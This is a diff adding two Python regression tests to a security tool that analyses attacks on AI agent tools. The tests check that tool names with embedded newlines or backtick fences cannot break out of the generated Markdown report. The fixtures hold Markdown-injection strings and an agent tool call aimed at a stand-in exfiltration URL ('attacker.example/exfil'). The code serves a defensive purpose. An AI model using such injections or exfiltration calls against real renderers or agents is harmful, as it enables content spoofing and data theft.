@@ -520,6 +520,69 @@ def test_w1_pin_mutation_changes_the_digest():
     assert a != b
 
 
+# --- F9 (review round 1): invariant/config_snippet newline breakout --------
+
+
+def test_w3_invariant_strips_an_embedded_newline_in_the_tool_name():
+    """`invariant` is rendered (render_markdown) as a single, 4-space-indented
+    line: ``"    invariant: {p.invariant}"``. Only the FIRST line of that
+    f-string gets the indent, so a tool name containing a literal newline
+    used to de-indent everything after it onto the surrounding document,
+    closing the indented code block early and letting the rest render as
+    live Markdown."""
+    evil_tool = "web_fetch\n[pwned](https://example.invalid/x)"
+    trace = [
+        {
+            "tool": evil_tool,
+            "args": {"url": "http://attacker.example/exfil"},
+            "result": "ok",
+            "is_error": False,
+        }
+    ]
+    ex = _exploit(pattern_id="w3", weakness="W3", effect_trace=trace, tool_calls=(evil_tool,))
+    rec = recommend(ex)
+    p = rec.prescriptions[0]
+    assert p.invariant is not None
+    assert "\n" not in p.invariant  # the tool name's own newline cannot survive
+
+    from markdown_it import MarkdownIt
+
+    html = MarkdownIt().render(render_markdown(rec))
+    assert 'href="https://example.invalid' not in html
+
+
+def test_w1_pin_config_snippet_cannot_close_its_yaml_fence_early():
+    """The digest pin's ``config_snippet`` is rendered inside a fixed
+    ` ```yaml ` / ` ``` ` fence (render_markdown). A tool name containing a
+    newline followed by its OWN line of backticks used to close that fence
+    early, letting the rest of the value render as live Markdown."""
+    from mylonite.contracts._types import ToolSpec
+
+    evil_tool = "search_docs\n```\n![pwned](https://example.invalid/x.png)\n```"
+    approved_text = "Approved text"
+    ex = _exploit(
+        pattern_id="w1",
+        channel="tool-description",
+        weakness="W1",
+        tool_calls=(evil_tool,),
+        body=approved_text,
+    )
+    target = TargetContext(
+        target_id="mcp:custom",
+        tools=(ToolSpec(name=evil_tool, description=approved_text),),
+    )
+    rec = recommend(ex, target=target)
+    pin = rec.prescriptions[0]
+    assert pin.config_snippet is not None
+    assert "\n" not in pin.config_snippet.split("description_pins:\n    ", 1)[-1].split(":")[0]
+
+    from markdown_it import MarkdownIt
+
+    html = MarkdownIt().render(render_markdown(rec))
+    assert "<img" not in html
+    assert 'src="https://example.invalid' not in html
+
+
 # --- degradation: never raises, always says why -----------------------------
 
 
